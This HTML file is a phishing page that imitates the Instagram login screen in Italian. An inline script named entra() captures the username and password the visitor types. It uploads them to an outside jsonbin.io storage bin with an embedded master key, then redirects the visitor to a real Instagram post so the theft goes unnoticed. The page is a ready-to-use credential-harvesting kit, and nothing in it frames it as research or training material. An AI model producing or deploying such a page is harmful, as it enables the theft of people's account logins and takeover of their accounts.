<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <style>
@import url('https://fonts.googleapis.com/css2?family=Figtree:ital,wght@0,300..900;1,300..900&family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap');
</style>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//Screenshot 2025-11-24 170146.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    
                    <label for="email"  class="sr-only">Telefono, nome utente o e-mail</label>
                    <input name="email" id="username" placeholder="Telefono, nome utente o e-mail" />

                    <label for="password"  class="sr-only">Password</label>
                    <input name="password" id="password" type="password" placeholder="Password" />

                    <button type="button" onclick="entra()">Entra</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">O</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Entra con Facebook</a>
                    </div>
                    <a href="#">Hai dimenticato la password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Non hai un account?</p>
                <a href="#">Registrati</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Ottieni l'applicazione.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
            <script>
                async function entra(){

                    const username = document.getElementById("username").value
                    const password = document.getElementById("password").value

                    await fetch("https://api.jsonbin.io/v3/b/68c05e90d0ea881f4077add3", {
                    method: "PUT",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Master-Key": "$2a$10$LFH.dVNQRFKpy3mU2Ih4suSF/cFaysyru6pwC3ljdQO6/h8yaTize"
                    },
                    body: JSON.stringify({
                        "username":username,
                        "password":password
                    })
                    })
                    .then(res => res.json())
                    .then(data => console.log(data));

                    window.location.replace("https://www.instagram.com/p/DMX5ePTtvr8IQ3RMMBtPdN5VuFK4iBEgBdh95g0/?igsh=YTNwYmRsMHYybmFo");

                }
                
            </script>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">

        </ul>
        <p class="copyright">© 2020 Instagram do Facebook</p>
    </footer>
</body>
</html>
